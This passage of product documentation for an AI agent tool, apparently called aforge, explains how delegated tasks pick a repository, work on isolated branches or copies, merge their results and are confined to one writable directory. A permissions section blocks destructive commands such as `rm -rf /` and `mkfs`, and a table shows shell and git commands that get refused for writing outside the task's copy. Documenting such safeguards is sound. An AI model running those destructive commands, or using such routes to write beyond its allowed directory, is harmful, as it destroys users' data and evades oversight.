# How work on its own actually runs

## What happens when I type /task — the forming line is stuck, the task spinner is not moving, nothing happens after /task

`/task <brief>` first raises one forming block at the transcript tail. Its dim `▏ `
hairline joins the word `task`, your verbatim quoted brief, and the live phase. The phase
begins as `sizing it up…` for the plain sized form and advances in place to
`shaping the brief…`; `/task solo` and the preset `single` road skip straight to
shaping. The spinner and count-up keep moving on the same frame clock as the
other live rows — the block starts that clock itself, so it turns even when the
conversation is otherwise idle, which is every time you type `/task`. In the plain-text
tier the mark is a still `*` on purpose and only the clock climbs. When the start
succeeds, the block is replaced in that same frame by
the normal started-task row and the task appears on its rail. When it fails, the block is
replaced by the error sentence. The hairline never remains on settled work.

The same block appears when you say yes to a task the model proposed on its card:
approving is followed by the same short pause while the brief is prepared, so the block
rises with the task's name on it — unquoted, because the name is aforge's word rather
than something you typed — and it collapses the moment the task appears on the rail.
Saying no, or redirecting the proposal, raises nothing. One forming look for both ways a
task begins; only the card, which asks before the model spends your money, is particular
to the proposed one.

## Which folder does a task work in — I opened aforge in my home folder, can a task work in a different repo, why did my task work in the wrong project

Every task has a **ground**: the one repository or folder the work is about. It is settled
before you are asked to approve anything, out of what this conversation already holds, and
the first of these that answers wins:

1. **You said so** — a path in your own request, `ground` on the proposal, or a folder this
   conversation is already **about**: one you named, or one a task's ground resolved to
   earlier and the conversation wrote down.
2. **What the conversation touched** — the repositories behind every file this conversation
   has read, edited, grepped or written, and every `cd` it ran, weighted so that lately
   counts for more. One repository ahead of the rest is the ground. **Two with real weight
   is a question, never a guess:** you are asked which one, and nothing starts until you
   answer.
3. **Where you are standing**, when that is a repository — what tasks have always used. A
   conversation opened inside its own project still gets exactly it. **But a ground never
   climbs out of the machine's scratch:** a folder inside the temporary directory
   (`TMPDIR`, `GOTMPDIR`, `/tmp`, `/private/tmp`, `/var/folders`) never reaches a repository
   sitting *above* that temporary directory, because scratch is where work is put down and
   never what work is about. So a task in a folder under `/tmp` stands on a repository that
   is itself inside the scratch, or on no repository at all — in which case it runs in
   place and gets no branch of its own, exactly as any other non-repository folder does.
   Nothing is refused and nothing extra is printed.
4. **Nothing** — the conversation's own folder, when there is no repository anywhere.

So a conversation opened in your home directory that has spent an hour reading
`~/code/thing` sends its task to `~/code/thing`, and not to the empty workspace beside the
session.

## Why am I asked which project a task is about — and am I asked again

**Once per folder, and then not again.** A ground the conversation resolved is kept on it,
so the answer you gave the first time is the answer the next task starts from. That covers
both roads in: a ground the conversation worked out from what it had been reading, and the
one you settled yourself when it asked which of two projects the work was for. The set
lives in the conversation's own folder, so closing the terminal does not lose it.

A folder **you named** stays until you say otherwise. One the conversation merely worked
out **decays**: if every call since has been in another repository, the fresh evidence wins
and the old answer stops being offered — the record stays, it just stops deciding. And two
folders the conversation is about, with nothing in the work to choose between them, are
the same one-keypress question rung 2 asks, in the two names you already know.

**How it stands on that ground is not asked either — it follows from the work.** A
repository the task writes in gets a working copy of its own, on a branch cut **from that
repository**. It merges back into an ordinary branch, or stays on its task branch when
your checkout is protected, detached, on another branch, or on a commit you moved after
the cut, and what that copy holds is your folder **as it stands** — uncommitted edits and
untracked files included. A repository
the task only reads — a whole contract that names no file — is left alone, and the task gets
a folder of its own. A plain folder with no history behind it is **copied** into the task's
folder, and the files the task wrote — its parts' files included — are laid back over it by
name when it lands, all of them or none of them. And "work
here" is you saying so: the task works in that folder itself, with nothing isolating it.

**Two refusals and one correction.** A task whose contract names an absolute path outside
its ground, in no repository, is turned back before anything is spent: `this task names a
folder it does not stand in: <path>`. **A path is a written name**, so a bare separator in
a sentence — "renders / no regression", "and / or", a lone `~/` — is prose and is refused
over nothing. A `ground` naming something that is not on this machine is `this task names
a folder that is not there: <path>`. And a brief that names a
path inside a *different* repository **re-grounds** the task onto that one — the brief knew
something the evidence did not — though nothing ever overrides a path you named yourself.

The check runs where the work stood, cut from the same ground; the card and the `/history`
row carry the ground and how the task stood on it.

## Does a task touch my working copy? — where does my task work, what the card calls the task's directory

By default, no. Each code task gets its own checkout of **the repository the work is about**
— its ground, resolved from what this conversation has been reading and editing (above) — on
its own branch, so you can keep working in yours while it runs. If your request explicitly
names another plain folder, the task works in that exact folder instead. A path inside a
repository still gets a branch from that repository; its card and its `/history` record
show the resolved place.

aforge makes that copy from your folder **as it stands** — see *Does a task see my
unsaved changes* above for what travels and what does not.

- **Directory:** `<session folder>/trees/<task id>`. The task folder is the task's home. It
  is either a worktree registered in the repository it was cut from, or a whole copy of
  your folder that is a repository of its own — see *Does my task see my .env* below, which
  says which and why it makes no difference to how the work comes back.
- **Branch:** `task/<title slugified, at most 32 characters>-<6 hex>` — for example
  `task/fix-the-nil-map-crash-9c1a2f`. The random tail lets the same title be proposed
  twice.

The task's copy lives inside the conversation's session folder, and aforge puts no task
directory in your repo. When it is a worktree you will also see its registration in the
repository's `git worktree list`; when it is a whole copy there is nothing to see there,
and the branch appears in your repository when the work comes home.

If a directory is already at that name it can only be this session's own dead run, so it is
removed with `git worktree remove --force`, pruned and deleted before the add.

**What the surface calls that directory is a plain-words label, never the mechanism.** The
settled card on the task page and the landing note in the chat both name where the work was
left, and they use the same four words for it:

- `a branch of your repository` — a branch cut in your own repository and checked out
  somewhere else.
- `its own copy of the folder` — a whole copy of your folder, forked or copied file by
  file. The branch, when there is one, still comes home to your repository.
- `your own folder` — a task that worked in place, in the directory you are standing in.
- `where` — aforge does not know which of those it was: work from a record written before
  it wrote this down, or a task handed an empty folder of its own to write in. It names the
  place and claims nothing about it.

The word `worktree` is never printed at you, on any card. Which one you were given is in
that task's own journal too, on the line beginning `its world is`.

Two limits:

- An explicitly named **plain folder**, or `where: in place` in a plain folder, runs **in
  place** there and says so:
  `it worked directly in the workspace: there was no repository to branch`.
  Inside a repository the task goes on a branch even when `in place` was asked for, and
  you are told: `in place was asked for, and <root> is a repository — the work goes on a
  branch cut from it instead`. The one exception is a referred place you explicitly told
  aforge to edit directly. While an in-place task runs, **the chat cannot write in that
  directory** — see *A task working in place holds the directory* below.
- A failed `git worktree add` fails the task with
  `could not prepare a working copy: git worktree add: <first line of git output>`

## A task in a conversation with no project — task failed saying it needs a project, task in a conversation with no folder, do tasks work without a repository

They work. A conversation opened where there is no project — your home directory, a temp
folder, a launcher; the place line reads `aforge` — has a **workspace of its own**, and
aforge quietly makes that workspace a git repository the moment the conversation opens.

So a task in a conversation that has been nowhere else takes the ordinary road described
above, against that repository instead of a project's: a working copy at `<session
folder>/trees/<task id>`, a branch `task/<title>-<6 hex>` cut from that workspace as it
stands, and a merge home
when the task lands. **A conversation that HAS been somewhere else goes there instead** — if
you have been reading a real project in this conversation, that project is the task's
ground and the workspace beside the session is not used at all. Work that
needs no repository at all — filing an issue with `gh`, reading something, writing a
document — simply runs, and its card and `/history` record name the task folder it stood
in.

Nothing has to be named first. `/workspace <path>` still anchors the conversation to a real
repository when that is what you meant, and naming a folder in the request still sends that
one task there.

Two things follow from it:

- The worker is told where it is standing, in one line of its instructions:
  `There is no project here: this is the conversation's own space, and it holds only what
  this conversation has put there.` A task folder holding nothing is the ordinary state of
  a conversation that never had a project, and the line is what stops a worker reading it
  as a checkout that failed.
- If that workspace is **not** a repository — a conversation from an older aforge, or a
  machine with no `git` — the task runs **in place** in it and says so, exactly as any
  other non-repository does. It is never refused for want of a project.

An older aforge stopped such a task with `this task needs a project; use /workspace <path>
or name where it should work`. Nothing says that any more.

That scratch workspace is `work/` **inside the conversation's own session folder**, so anything
made there is inside the conversation and deleting the conversation deletes it. The path and the
three ways to keep the work are on the starting-aforge page, under *Where do task files go when I
did not open a project*.

## Does a task see my unsaved changes — does a task get my uncommitted work, do I have to commit before starting a task

**Yes, and you do not have to commit first.** A task's world is your folder **as it stands
at the moment you start it** — the edits you have not committed, and the files you have
never added. It works in a copy of that, not in a copy of your last commit.

Before that, it was your last commit and nothing else, and it was expensive: a task handed
a brief describing work that was still uncommitted spent an hour looking for files that were
not on its disk. Nothing about the isolation changed — you keep typing in your own folder
while it runs, and what you type does not reach it.

Aforge says so before it spends anything. When you start a task and your working copy has
uncommitted changes, one line goes into the chat with the brief:

```
your unsaved edits go with it · your own copy is untouched
```

It is a **note and not a gate** — the task starts on the very next breath and nothing waits
for you. It is said once per task you start, and it is not said at all when your working
copy is clean or when the conversation is not in a repository, because there would be
nothing to tell you. **New files you have never committed do not get the line** — build
output and scratch files would otherwise make it appear on every single start — but they
travel with the task just the same.

**How your work travels, if you want to know.** aforge writes a commit of your folder as it
stands, called `the world this task started from: <title>`, and cuts the task's branch from
that. Your own checkout is not touched: your HEAD does not move, your index does not move,
and your uncommitted work is still uncommitted in front of you. That commit is scaffolding
and it never comes home — when the task lands, only what the task itself wrote is merged.
When the task got a whole copy of your folder, that commit is written in the copy and your
repository never holds it at all.

**What your `.gitignore` covers travels too**, most of the time — a `.env`, an installed
`node_modules`, a dev database. That depends on how the copy was made, so it has a section
of its own: *Does my task see my .env* below says when it happens and how to tell.

**If you would rather it did not have your half-finished work,** commit or stash before you
start. There is no flag for it: the world is the folder, and the folder is what you leave in
it.

**And the same is true one level down.** When a task splits itself into parts, each part
starts from the *parent task's* folder as it stood at the split — the parent's unfinished
work included, written to the family's own branch first. The tasks page, *What the parts
start with*, is where that is spelled out.

## Does my task see my .env — does a task get node_modules, an installed dependency tree, the dev database, the files git ignores

**Usually yes.** A task's world is a copy of your whole folder, made by furrow, which every
aforge carries inside itself. A copy made that way holds what git was told to ignore
alongside everything git can see: your `.env`, an installed `node_modules` or `.venv`, a
dev database sitting in the folder, a build somebody spent ten minutes on. That is the
difference between a task that can run your tests and one that spends its first four steps
discovering that it cannot.

None of those files come home. They were invisible to git on the way out and they are
invisible to git on the way back, so what lands on your branch is only what the task itself
wrote — and your own copy of them is never touched.

**When it cannot be done that way**, the task falls back to a copy made by git, and then
what your `.gitignore` covers is the one thing it does not have. Two reasons:

- furrow could not take that folder on this machine — the binary will not run, the folder
  will not attach, the fork failed. Nothing is refused and nothing is reported: the copy is
  simply made the other way.
- the folder is a **linked worktree** — its `.git` is a file naming another repository
  rather than a directory of its own. aforge never copies one of those whole, because a
  byte-exact copy would write the task's commits into the repository that file points at
  and move a checkout you are standing in.

Everything else is the same either way: your uncommitted edits and your untracked files
travel on both roads, the task works on `task/<title>-<6 hex>`, and its work comes home as
a merge into your branch — unless the checkout is protected, detached, on another branch,
or on a commit you moved after the cut, in which case the branch is kept and named for you
instead. Commits from aforge's own landings do not count as you moving it.

**To see which one a task got,** open its page: the first line of its log says what world
it worked in — `its world is a fork of <folder> as it stood, taken whole` for the whole
copy, and `its world is a branch off <folder> as it stood, uncommitted work included` for
the git one.

**Copying your folder whole writes one thing into it:** a `.furrow/` directory, which
furrow keeps its own ids in. aforge adds that name to your repository's
`.git/info/exclude`, so it never appears in `git status` and can never be committed. That
file is local to your checkout — it is not committed, not pushed, and nobody else working
on the project sees it.

## A task that never started — its world did not match, stale ground, my task failed before it did anything, expects

A brief can name files and symbols of a world that is not in the folder the task gets: a
file that moved, a folder somebody renamed, a change that was still uncommitted somewhere
else. Before this was caught, that was an expensive way to find out — one task spent
twenty-two minutes and $7.99 rewriting a test file for a component its own brief said had
been deleted, four lines at a time, until the step limit stopped it.

So a brief may carry **what it assumes is already true** of the folder it will get, and
aforge checks every line of it **before anything starts** — no model call, no money. Each
assumption is a place, and optionally something that must be findable there:

- a file or folder that must be there — `internal/tui3/taskchip.go`
- one that must **not** be, which is how you say something was deleted
- text that must be findable at that place: a symbol, a heading, a column name

It is **optional and never invented**. Whoever writes the brief writes the assumptions,
because only they know which of their own sentences the work leans on; aforge never
reads a brief and guesses. A brief that assumes nothing is checked against nothing and
costs nothing, which is most tasks.

**Both doors that write a brief carry them.** A task handing parts out under itself
writes assumptions for each part — that is where a brief is written about a folder its
reader has not been given yet, and where the twenty-two minutes went. A task proposed
straight from a conversation carries them too: the conversation can usually see the
folder it is proposing against, but not always, and work aimed at a project three
directories away, or at a folder nothing in this window has opened, goes wrong the same
way.

**When one does not hold, the task lands at once** — before anything is spent — and its
row reads `its world did not match`. The report names every assumption that failed, what
was found instead, and what can be done about it:

```
its world is not what its brief describes, so nothing was spent on it.

· the survivors of taskstrip.go live in taskchip.go — it does not say stripKey (taskchip.go)
· internal/tui3/topbar.go is there — it is not there

Either bring that work into the folder this was cut from and start it again, hand the
part out again with a brief that matches what is really there, or say which of the two is
right.
```

Every failed assumption is named, not the first: a brief written against a world one
change behind usually misses several, and fixing them one at a time costs a landing each.
What held is not listed, so the lines that matter are the only lines there.

**What it cannot check** is anything that is not in the folder — a URL that must answer, an
account that must still be logged in. Those belong in the brief itself, where they
already went.

## A task working in place holds the directory — nothing was written, a task is using this working copy, I cannot edit a file while a task runs

When a task got a checkout of its own, you and it are in different directories and nothing
either of you writes can reach the other. **When a task is running in place there is only
one directory**, and two writers in one directory do not produce either person's work.

So a task running in place **holds that directory for as long as it runs**, including
while its work is being checked and repaired. Anything else that tries to write a file
there — this conversation, one of the hands inside a reply, another task — is refused
before the write happens, and told who has it:

```
src/analysis.rs is in the working copy task 4 (repair the parser) is using right now, so
nothing was written. That work is writing there until it finishes — wait for its report and
make this change on top of what it did, or change something outside /workspace/rust-java-lsp.
```

Three things this does **not** stop:

- **Reading.** Everything can still read every file in there. The hold is on writing only.
- **The task's own family.** The task itself, its sub-tasks, and the hands its worker forks
  are all that task writing, and they are never refused.
- **`bash`.** A shell command's effects are whatever the command did, so a command that
  writes is not caught. Only `write` and `edit` — the two hands whose file is known before
  they run — are held back.

The hold ends the moment the task does: it lands, fails, is stopped, or the process closes,
and the next write goes straight through. Nothing has to be released and there is nothing to
clear by hand.

**Two tasks cannot both run in place in one directory.** Whichever started first has it;
the second is refused its writes and told which task to wait for. When the first lands, the
second gets the directory.

## A task that has written a file holds that file — I cannot edit a file while a task runs, chat edit blocked, single writer

When a task has a checkout of its own, you can still write files it has not touched. **A
file it has already written is its file until it lands.** A chat `edit` or `write` of that
file is refused with the task named:

```
cart.py is held by task 2 (discount code entry), so nothing was written.
```

The hold is one file at a time, not the directory. A second task that tries the same file
is refused the same way: one owner per file. The write is not routed into the task — it is
refused so the two copies cannot drift. You can still edit that file yourself in your own
editor; this is a rule about the chat's tools, not a lock on disk.

The hold ends the moment the task does: it lands, fails, or is stopped, and the next write
goes straight through. A task that has written nothing yet owns nothing.

## What a finished task brings home, and what it leaves behind — where does the finished work end up

A task lands **the files it wrote** — every path it handed to its `write` or `edit` hand,
plus anything its own report names on a `files:` line. Nothing else is committed and
nothing else merges.

**A task that handed parts out lands what the whole family wrote.** Each part works in a
copy of its own, cut from the task's working copy, and as each one finishes its files join
the task's own list. That
one list is what lands — onto an ordinary checked-out branch where the ground is a
repository, or kept on the task branch when the checkout is protected; laid back over
your folder by name where it is a plain folder. You never have to name a part's file again
to keep it, and a part that wrote nothing adds nothing. A part that did not finish is not on
the list, because its work never came home into the task's copy; its own branch is kept
instead and its card says where.

**And the same list lands whenever the landing happens.** A task that landed needing your
look is settled later — you press accept, or a fresh check comes back holding — and what
goes home then is the list it settled with. On a plain folder that means the accept lays the
whole family's files back over your folder, exactly as a task that finished cleanly would
have — unless you changed one of those files yourself in the meantime, which has its own
section below; on a repository it follows the same merge-or-keep landing as checked work.

That is why a task's branch is a change you can read. Its checkout is its own to make a
mess in: it installs what your tests need, it builds, it caches. A `.venv`, a
`node_modules`, a `target/`, a `.pytest_cache`, a downloaded model — none of those is
something the task wrote, so none of them reaches your branch. Tasks used to land with the
virtualenv attached and the actual change buried inside it.

What it leaves behind is named in the landing, and the sentence says where it went:

`it left files it did not write, and they went with its working copy rather than onto your branch: .venv/bin/activate, .venv/pyvenv.cfg and 812 more`

A task's checkout is removed once its work is merged, and the leavings go with it — that is
what a throwaway checkout is for. When the branch is kept instead, the ordinary task folder
and its leavings stay where they are, and the sentence reads `they
are still in its task folder rather than on its branch`. The first few files are named and
the rest are counted. Your `.gitignore` is respected exactly as it always was: a path your
repository ignores is not committed and is not mentioned.

**When a command made the deliverable.** A task that runs a scaffold, a code generator or a
formatter produces real files it never typed. It brings them home by naming them on the last
line of its report — `files: site/index.html, site/app.css` — and only names that really
exist in its checkout are believed. A task that says nothing about them has left them
behind, and that is the difference between a deliverable and a dropping.

## Why my task's branch was kept — I committed, amended, rebased or reset my branch while it ran, it did not merge, my checkout is on main or dev, aforge never writes to a protected branch, how do I take the work, why did the work not land in my checkout, why didn't my task merge, which branches does aforge refuse to write

A finished task never writes a protected branch. The protected names are `main`, `master`,
`dev`, `develop`, `development`, `staging`, `stage`, `trunk`, `production`, `prod`, and
`release`; any branch a remote names as its default counts too. The task is still **done**.
Its branch is kept, its working copy is given back, and the card says `branch kept · task/x`.

You will see one exact reason:

- `its branch task/x was kept: your checkout is on dev, which aforge never writes to — merge it when you are ready`
- `its branch task/x was kept: your checkout has moved from feat/a to feat/b since the work was cut — merge it where you want it`
- `its branch task/x was kept: your checkout is not on a branch — check one out and merge it`
- `its branch task/x was kept: feat/x has moved on since the work was cut — merge it where you want it`

Take it with `git merge task/x` on the branch where you want the work. `git branch --list
'task/*'` lists finished work waiting this way. Or check out a feature branch before
starting tasks; when it is still checked out at landing and any commits since the cut came
from aforge's own landings, finished work comes home by itself. A checkout that is on a
different branch than when the task started, or detached before it landed, is kept by the
same rule so aforge never guesses where you meant the work to go. The test is both the
branch and the commit it was cut from: work you commit, amend, rebase or reset on that
branch yourself keeps the task's branch instead of merging into it. Another task landing
through aforge does not count as you moving it.

## My task's branch would not merge — what happens then

Nothing is forced onto your branch. A merge that hits a conflict is **abandoned** and your
checkout is put back exactly as it was: no `<<<<<<<` markers in your files, no half-finished
merge to get yourself out of.

The task then lands as **needs your look** rather than finished, and the report names the
files that changed on both sides:

`finished, but needs your look — its branch task/edit-the-parser-9c1a2f did not merge cleanly and was kept: internal/auth/session.go changed on both sides`

The landing note the model reads does **not** say the work finished or that the branch
merged. It names the kept branch. A merge that did not fasten the branch to yours is not
a landing, even if the task's own report said the work arrived.

A clash with work you **committed** on your own branch is kept before a merge is tried.
The conflict road above is for your uncommitted work and for repositories aforge owns,
where a committed clash can still reach the merge itself.

**A landing never ends in a sentence that names nothing.** There is one shape of refusal
where git will not start the merge at all — you have uncommitted changes in the very files
it would write — and it puts the file list in the body of its message rather than on the
first line. That used to be quoted straight into your report and stopped at the colon,
naming no files. It now says which files it was about, whichever way git refused.

## I had uncommitted work in the same files — what happens to it

**Your own uncommitted work is carried, or the landing is refused. Never both.** A task is
carved from your folder AS IT STANDS, uncommitted edits included, so when the task changes
the same file you are part-way through changing there are two versions of your own work.

What happens is one of two things, and you are told which:

- **Carried.** Your changes are set aside, the branch merges, and your changes go back on
  top of it. The report says so and names the files:
  `your own uncommitted work in internal/auth/session.go was set aside while its branch merged, and put back afterwards`
- **Refused.** When your changes cannot go back over the merge, nothing is left half-done:
  your checkout goes back to exactly the commit and exactly the content it had, the branch
  is kept, and the report names the files —
  `its branch task/… did not merge cleanly and was kept: your own uncommitted work in internal/auth/session.go is in the same files, so your tree was left exactly as it was`

Untracked files are the one thing that is never set aside: a file git has never seen cannot
be put back over itself, so a clash with one is refused and named rather than moved.
Nothing is ever left in a `git stash` for you to find later — every road out of a refusal
ends with your work back in your tree.

**And when the copy your task started from could not be lifted back off its branch**, the
report says that too, in as many words:
`its branch task/… still carries your own uncommitted work: the copy of it the task started from could not be taken back out`.
That used to happen silently, and the merge then failed for a reason nothing could explain.

The work is committed on that branch, so `git merge task/…` is a real offer whenever you are
ready to reconcile the two versions. Nothing waiting on the task fails — it waits until you
decide, exactly as with any other task that needs a look.

Pressing **accept** on the card does not change this. Accepting says the work is good, and
it is; it cannot make two versions of one file into one, so an accept whose merge conflicts
leaves the task needing your look with the same sentence.

## My task could not save what it wrote — nothing merged, the file is still there, it says it could not be brought home

A landing that cannot put the work away **does not merge, does not tidy anything up, and
does not say done**. The work stays on disk in the task's own folder, which is then the only
copy of it, and the task lands as **needs your look** with the report naming that folder and
quoting whatever went wrong — a disk that filled, a read-only mount, a permission somebody
changed:

`finished, but needs your look — its work is in ~/.aforge/sessions/<id>/trees/7 and could not be saved to its branch: fatal: Unable to create '…/index.lock': Permission denied`

Nothing of the task's working copy is given back: the branch is kept, the copy is left
registered where it is, and your own branch is untouched — no empty merge, no commit that
holds none of the work. The landing note says no more than the report does, because there is
no branch to offer you: the folder in that sentence is where the files are.

**On a plain folder it is the same answer.** The files the task wrote go back over your
folder **whole or not at all**: they are staged beside where they are going first, and only
when every one of them can be placed does anything move. A lay that cannot happen leaves
your folder **exactly as it was** — not one file of the half that would have fitted — and
says so:

`finished, but needs your look — its work is in ~/.aforge/sessions/<id>/trees/7 and could not be saved into ~/notes: the work could not be laid into a clean copy: mkdir ~/notes/sub: not a directory`

The task's copy is kept, so everything the family made is still in the folder that sentence
names.

**Pressing accept settles it where it stands, and you are not asked twice.** The tree
refusing the work is not a question anybody can answer differently the second time: the
folder has no repository in it, or the disk is full, or a file of your own is where a
directory has to go, and accepting again runs the same command into the same refusal. So one
accept ends it. The task settles as done with the lead
`taken as it stands, and it could not be brought home, so the work stays where it is — `
over the sentence naming the folder, nothing is merged and nothing is deleted, and a second
answer on the same task is told
`task 7 is done, and only a task that needs a look is waiting on somebody to decide`.

**A merge conflict is the other thing and still comes back to you.** Two versions of one
file is a decision only you can make, so an accept whose merge conflicts leaves the task
needing your look with the same sentence, and you can accept it again once you have sorted
the file out. The difference is which failure it was: the tree would not take the work at
all, or the work and your own copy disagree. Before this, both went back to the card, and a
measured run accepted the same task three times and got the same refusal three times.

**Which one it was is settled by trying the folder, never by reading the message.** Git says
"Permission denied" when it cannot lock a branch's ref in a folder you can write to
perfectly well, and a hook of yours can print anything it likes. So when a commit is
refused, aforge writes a scratch file into the repository and removes it again: if that
works the refusal is about the **work**, the task comes back for your look, and accepting it
after you have cleared whatever was in the way is worth doing. Only a folder that will not
take that write — a read-only mount, a permission, a full disk, a quota — settles the task
where it stands.

## What a task can do while it runs

A task is the same agent you talk to, with the same tools, in a quieter place.

It inherits the conversation's provider client, context window, image support, roles
source, search provider and fetcher, **connected accounts**, image-generation model and
document engine. It inherits **not the transcript** — one assembled brief is its whole
world, and your own message is the first part of it (below, under *What the task actually
reads*). The
one thing it is given of what aforge remembers about you is the handful of lines its own
brief needs: the conversation asks the router once, against that brief, and puts the
answer at the top of the task's instructions (what-i-remember). The task itself never
writes a memory — a family of eight tasks would be eight writers on one brain, each blind
to the others. If it runs on a **different model from the conversation**, its context
window is set to 0 rather than reusing a window measured for another model.

**Three tools are missing from its belt:** `watch`, and the settings pair `settings` and
`change_setting` — a task works in a copy of its own with nobody watching it, so a watch's news
would arrive in a conversation it does not have, and a permanent change to your machine
that no transcript ever showed you is exactly what a task must not be able to make.

**It keeps `propose_task` and `tasks`, as a pair.** A task may hand pieces of its own work
out when its brief holds parts that do not need each other — at most **5**, and a piece it
hands out cannot hand out more — and `tasks` is how it then watches them. Inside a task
both are scoped to its own family: `tasks` lists the pieces it handed out and refuses an id
outside them with `No task "…" among the pieces you handed out.` Its brief is still its
whole world; the project's history is not its to read. The tasks page has the whole of it,
under *When a task splits its own work*.

**And it can use hands.** `fork` is on a task's belt for the same reason it is on the
conversation's: a task worker is a mind in the middle of its own work, so it can copy
itself into two to four hands inside one of its own turns, in its own copy of the
repository, and stitch what they bring back. The tasks page has the whole of it, under
*Hands*. The one agent that cannot fork is a hand — the fork is one level deep, and a hand
simply does not have the tool.

Approval inside a task is allow-everything, with the critical floor still under it (things
like `rm -rf /`, `mkfs`, redirecting onto a raw disk, shutdown). When a call hits that
floor there is nobody to ask, so the task reads the refusal
`refused in a task: <rule> — nobody to ask` and keeps working. `use_service` cannot
connect a new account inside a task.

A task is also a job. It shows in `jobs list` labelled `task 7` with the title as detail,
`jobs kill` ends it exactly as a time limit does, and closing the session kills every
running task. Its step-by-step log is the job log, at
`<session folder>/logs/jobs/<job id>.log`.

**A task's own droppings are kept with the conversation, never in the checkout it works
in.** The job log above, and the bytes of any long tool result lifted out of a worker's
live context to save room, both land under the conversation's `logs/` — the same place the
conversation's own do. A worker reads a lot of files, and none of what the harness keeps
about that reading is your work: nothing of aforge's is written into your repository or
into the task's copy of it. Only a conversation with no folder at all falls back to
`<workspace>/.aforge-v3/`.

The worker's **working set is a cleanup target, not a memory cliff**. Crossing it retires
read results and assistant reasoning only after the worker has successfully changed the
workspace from the context that contained them, and only when the pass can buy a full
stretch of headroom. A task that must read several things before its first write therefore
keeps those observations verbatim even above the working-set target. It does not trade the
unfinished work for a cheaper prompt and then spend later turns reading spill files.

There is still a hard backstop: if still-needed material approaches the actual model
window after answer room and the standing prompt are reserved, the worker may spill the
oldest observations rather than send a request the provider will reject. That safety line
uses the selected model's real context size; it is deliberately separate from the smaller
cost-oriented working set. With an unknown context size no larger line is invented.

## Can a task change my settings — can a task look up an old conversation, can a task start a watch, my task said it cannot do that from here

No, to all three, and a task is now TOLD so rather than left to find out by
calling a tool that is not there. Four things a conversation can do are absent
from a worker's belt, and its instructions say what to do instead:

- **Change a setting.** `settings` and `change_setting` are off inside a task. A
  worker runs in a copy of its own with nobody watching, and a permanent change
  to your machine that no transcript ever showed you is exactly what it must not
  be able to make. A task asked to change a preference says it cannot from a
  task and points you at `/settings`; it is told never to edit a config file instead.
- **Look up an earlier conversation.** `search_conversations` reads the index in
  the memory store, and a task is handed no store, so what was said in other
  conversations cannot be looked up from inside one. A worker answers out of the
  brief it was given.
- **Start a watch.** `watch` delivers its news into a conversation and a task has
  none. A worker waits with an ordinary foreground `bash` call.
- **See the work that already ran** — but only at the bottom of the tree. A task
  keeps `tasks` and `propose_task` while it may still hand pieces out; a piece
  that was handed out by a piece is standing on the floor and has neither. Its
  instructions tell it that the record of earlier work is not reachable from
  where it stands, and to say so plainly when you refer to something it cannot
  see, rather than inventing it.

And **it cannot design or offer a saved shape of work.** `build_harness` and
`list_harnesses` want a store to write the page into, a runner, and somebody
watching who can answer the card; `propose_subharness` and `list_subharnesses`
want a saved program on this machine and that same watcher. A worker has none of
it, so those verbs are off its belt and the paragraphs explaining what a recipe
and a saved program ARE do not ride in its instructions either — it is not shown
a road it cannot take.

None of these is a refusal you will see as an error. **A capability a worker
cannot have is absent from its belt rather than present and failing**, and its
instructions are composed to match the belt it was actually given — so it is
never told to call a verb it does not have. **The exception is a hand.** A hand
is this mind copied inside one turn, and it opens on the caller's own
transcript, system page and all, because that shared prefix is the whole reason
forking is cheap — so what a hand reads about tools is its caller's and not its
own. Giving a hand its own tail, naming the nine tools that are actually its,
is the change tracked as #434b.

## How a task is told to spend its time — the measure, a zero, and not remaking what exists

Beyond the tools, a task is given three working habits in its instructions. They are
written as principles rather than examples, because aforge hands tasks prose, research,
data, operations and code through the same door and a habit written in one trade's words
is a habit that is wrong for the next job. **The chat is given the same three, in the
same words** — see *What aforge can do for you* — because the approach to a piece of work
is usually chosen in the conversation, before the task exists.

- **When the work comes with its own measure, that measure is the loop, not the report.**
  A check to run, a count to reach, a reading somebody will take — the task is told to
  work *between* readings rather than saving the reading for the end, and that the
  interval between two of them **shrinks when the reading is zero** rather than growing.
  A result it cannot explain is the moment to take the reading more often and change less
  in between. Anything changed but never measured is called what it is: a guess.
- **Nothing on every count is one shared fault, not many separate ones.** Parts that do
  not depend on each other do not all fail at once by coincidence, so a task reading zero
  everywhere is told to find what they have in common — how they are reached, where they
  are looked for, the step before any of them runs — and to prove that shared path carries
  one case end to end **before** it touches any single part. Uneven readings say the
  opposite, and there it starts with the worst one.
- **Before making a thing itself, it spends one step asking whether it already exists** in
  a form it can use: a tool, a source, a service, something the work already carries,
  something done here before. Asking costs one step; not asking costs the whole thing.
  And it asks *before* the first piece exists, because the answer stops being welcome once
  there is something to be attached to.

These came out of two unattended runs of the same brief measured against each other: the
one that hunted for what every zero had in common was off zero eleven minutes later, and
the one that answered the same zero by reading its own work spent most of its calls
changing things it had never measured — and built from scratch something that already
existed, without ever spending the one step it would have cost to ask.

## Where a task may write — its own copy, and nowhere else on the machine

A task **works in one directory** and may **write only there**. That directory is its own
copy of the repository — a branch of yours checked out somewhere else, a whole copy of your
folder, or your folder itself when there is no repository. Everywhere else on the machine it may **read as much as it likes** and change
nothing.

**Reading anywhere is the point.** A task briefed about a repository it is not standing in
still has to look at it: `read`, `grep`, `ls`, `cat`, and `git log`, `git show`, `git diff`,
`git status`, `git branch -a`, `git remote -v` against **any** repository on the machine all
run normally. Looking has never been what goes wrong.

**A path written into the task's contract is already its copy's path.** The brief, what to
produce and what done means are handed over with every address at or below the project
rewritten as the same address inside the task's own copy — so
`/Users/you/code/yours/internal/widget.go` reaches the task as
`…/trees/1/internal/widget.go`, and a task that follows its own contract is writing where it
is allowed to. A path that is **not** under the project is left exactly as written, so a
contract that really does point somewhere else still earns the refusal below. **Your own
words are never rewritten**: they are quoted to the task exactly as you typed them, with the
two folders named beside them so it knows which one a path in your sentence means here. And
what it reads at that address is **its own copy, as the project stood when it started** —
not the original, which you may still be changing while it works.

**Writing anywhere else is refused before it runs**, and the task reads the refusal and
carries on. It covers every hand that names its target:

| Aimed outside its copy | What it looks like |
| --- | --- |
| `write` and `edit` | any path outside the task's own copy |
| a shell command that moved first | `cd ~/code/yours && git checkout -b fix`, `cd ~/code/yours && mkdir -p src` |
| git pointed somewhere else | `git -C ~/code/yours add .`, `GIT_DIR=~/code/yours/.git git update-ref …`, `--work-tree=` |
| the file hands | `cp`, `mv`, `rm`, `mkdir`, `touch`, `tee`, `chmod`, `sed -i`, `patch` |
| a redirection | `echo x > ~/code/yours/NOTES.md` |

The wording it reads names **both the path and the directory it may write in**:

> /Users/you/code/yours/NOTES.md is outside your copy — this task works in
> /Users/you/.aforge/v3/projects/…/trees/1; read anywhere, write only there. Say what needs
